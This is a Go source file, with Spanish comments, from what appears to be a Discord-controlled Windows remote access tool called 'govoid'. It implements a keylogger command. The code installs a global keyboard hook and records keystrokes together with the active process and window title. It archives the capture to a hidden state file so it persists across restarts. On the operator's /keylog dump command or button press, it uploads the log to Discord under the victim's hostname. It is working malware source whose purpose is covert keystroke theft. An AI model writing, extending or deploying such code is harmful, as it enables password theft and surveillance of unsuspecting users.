//go:build windows

package commands

import (
	"bytes"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/win32"
)

// KeylogBuffer guarda lo capturado agrupado por sesión de ventana. Cada cambio
// de proceso o de título abre una sesión nueva; el dump sale ordenado y con
// contexto, no como una tira de texto sin dueño.
//
// Vive en memoria a propósito: sobrevive a las caídas y reconexiones de Discord
// —el hook y el buffer son del proceso, no de la sesión del bot— y solo se
// vacía cuando el operador manda clear.
type KeylogBuffer struct {
	mu       sync.Mutex
	sessions []*win32.WindowSession
	current  *win32.WindowSession
}

// globalBuffer es el buffer que usa el comando /keylog.
var globalBuffer = &KeylogBuffer{}

// StartSession cierra la sesión en curso y abre otra. Si la ventana no cambió
// no hace nada: el vigilante llama cada 500 ms y no puede crear ruido.
func (b *KeylogBuffer) StartSession(process, title string, at time.Time) {
	b.mu.Lock()
	defer b.mu.Unlock()

	if b.current != nil {
		if b.current.ProcessName == process && b.current.WindowTitle == title {
			return
		}
		b.closeLocked()
	}

	b.current = &win32.WindowSession{
		StartedAt:   at.UTC(),
		ProcessName: process,
		WindowTitle: title,
	}
}

// Append suma una tecla a la sesión en curso. Si el hook capturó antes de que
// el vigilante viera la ventana, la sesión nace aquí con lo que se sepa.
func (b *KeylogBuffer) Append(event win32.KeyEvent) {
	b.mu.Lock()
	defer b.mu.Unlock()

	if b.current == nil {
		b.current = &win32.WindowSession{
			StartedAt:   event.Timestamp.UTC(),
			ProcessName: "desconocido",
			WindowTitle: "",
		}
	}
	b.current.Events = append(b.current.Events, event)
}

// closeLocked archiva la sesión en disco y la pasa a la lista cerrada.
func (b *KeylogBuffer) closeLocked() {
	if b.current == nil {
		return
	}
	b.appendArchiveLocked(b.current)
	b.sessions = append(b.sessions, b.current)
	b.current = nil
}

// appendArchiveLocked deja una copia en disco de la sesión cerrada. El dump
// sale de memoria, pero un reinicio del agente ya no se lleva lo capturado.
func (b *KeylogBuffer) appendArchiveLocked(session *win32.WindowSession) {
	if len(session.Events) == 0 {
		return
	}
	path := keylogArchivePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return
	}
	if info, err := os.Stat(path); err == nil && info.Size() >= keylogArchiveMax {
		_ = os.Rename(path, path+".1")
	}
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		return
	}
	defer func() { _ = file.Close() }()
	_, _ = file.WriteString(formatSession(session) + "\n")
}

func keylogArchivePath() string {
	return filepath.Join(config.StateDir(), "keylog.txt")
}

const keylogArchiveMax = 8 << 20

// FormatDump arma el texto con un bloque por sesión. Las sesiones sin teclas
// —cambiar de ventana y no escribir nada— se omiten.
func (b *KeylogBuffer) FormatDump() string {
	b.mu.Lock()
	ordered := make([]*win32.WindowSession, 0, len(b.sessions)+1)
	ordered = append(ordered, b.sessions...)
	if b.current != nil {
		ordered = append(ordered, b.current)
	}
	b.mu.Unlock()

	var out strings.Builder
	for _, session := range ordered {
		if len(session.Events) == 0 {
			continue
		}
		if out.Len() > 0 {
			out.WriteByte('\n')
		}
		out.WriteString(formatSession(session))
	}
	return out.String()
}

// formatSession escribe el header y el texto de una sesión.
func formatSession(session *win32.WindowSession) string {
	process := session.ProcessName
	if process == "" {
		process = "desconocido"
	}
	title := strings.ReplaceAll(session.WindowTitle, "\n", " ")

	var out strings.Builder
	fmt.Fprintf(&out, "[%s UTC] %s — \"%s\"\n",
		session.StartedAt.UTC().Format("2006-01-02 15:04:05"), process, title)

	for _, event := range session.Events {
		if event.IsSpecial {
			out.WriteString(event.Label)
			if event.Label == "[ENTER]" {
				out.WriteByte('\n')
			}
			continue
		}
		out.WriteRune(event.Rune)
	}

	text := out.String()
	if !strings.HasSuffix(text, "\n") {
		text += "\n"
	}
	return text
}

// DumpToFile devuelve el dump en UTF-8 y el nombre del adjunto.
func (b *KeylogBuffer) DumpToFile() ([]byte, string) {
	name := fmt.Sprintf("keylog_%s_%s.txt", safeHostname(), time.Now().Format("20060102_150405"))
	return []byte(b.FormatDump()), name
}

// ClearBuffer vacía el buffer bajo mutex. Lo ya cerrado queda archivado.
func (b *KeylogBuffer) ClearBuffer() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.closeLocked()
	b.sessions = nil
	b.current = nil
}

func safeHostname() string {
	host, err := os.Hostname()
	if err != nil || host == "" {
		host = "host"
	}
	clean := strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			return r
		}
		return '-'
	}, host)
	if clean == "" {
		return "host"
	}
	return clean
}

// StartGlobal engancha el buffer al hook y lo instala. Si ya estaba activo es
// no-op: el hook no se duplica.
func StartGlobal() {
	win32.Default.SetSink(globalBuffer)
	if err := win32.Default.Start(); err != nil {
		slog.Error("keylogger: no se pudo instalar el hook", "err", err)
		return
	}
	slog.Info("keylogger: captura global activa", "archivo", keylogArchivePath())
}

// StopGlobal desinstala el hook. El buffer no se toca: lo capturado sigue ahí
// para el próximo dump.
func StopGlobal() {
	win32.Default.Stop()
	slog.Info("keylogger: captura detenida, buffer conservado", "sesiones", globalBuffer.sessionCount())
}

func (b *KeylogBuffer) sessionCount() int {
	b.mu.Lock()
	defer b.mu.Unlock()
	count := len(b.sessions)
	if b.current != nil {
		count++
	}
	return count
}

// Keylog atiende /keylog start|stop|dump|clear.
func Keylog(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	switch StringOption(i, "action") {
	case "start":
		StartGlobal()
		Finish(s, i, "🔑 Keylogger iniciado.")
	case "stop":
		if !win32.Default.Running() {
			Finish(s, i, "ℹ️ El keylogger no está corriendo.")
			return
		}
		StopGlobal()
		Finish(s, i, "🛑 Keylogger detenido. El buffer sigue intacto.")
	case "dump":
		sendKeylogDump(s, i)
	case "clear":
		globalBuffer.ClearBuffer()
		Finish(s, i, "🧹 Buffer del keylogger vaciado.")
	default:
		Finish(s, i, "❌ Acción inválida. Usa start, stop, dump o clear.")
	}
}

// KeylogDump atiende el botón del panel. Mismo camino que /keylog dump.
func KeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	sendKeylogDump(s, i)
}

// KeylogStart atiende el botón ▶️ del panel.
func KeylogStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	StartGlobal()
	Finish(s, i, "🔑 Keylogger iniciado.")
}

// KeylogStop atiende el botón ⏹ del panel.
func KeylogStop(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	if !win32.Default.Running() {
		Finish(s, i, "ℹ️ El keylogger no está corriendo.")
		return
	}
	StopGlobal()
	Finish(s, i, "🛑 Keylogger detenido. El buffer sigue intacto.")
}

func sendKeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	data, name := globalBuffer.DumpToFile()
	if len(bytes.TrimSpace(data)) == 0 {
		Finish(s, i, "ℹ️ Buffer vacío — no hay teclas capturadas todavía.")
		return
	}

	content := fmt.Sprintf("🔑 Keylog — %d bloques, %.1f KB",
		globalBuffer.sessionCount(), float64(len(data))/1024)

	file := &discordgo.File{
		Name:        name,
		ContentType: "text/plain; charset=utf-8",
		Reader:      bytes.NewReader(data),
	}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files:   []*discordgo.File{file},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir el dump: "+err.Error())
	}
}
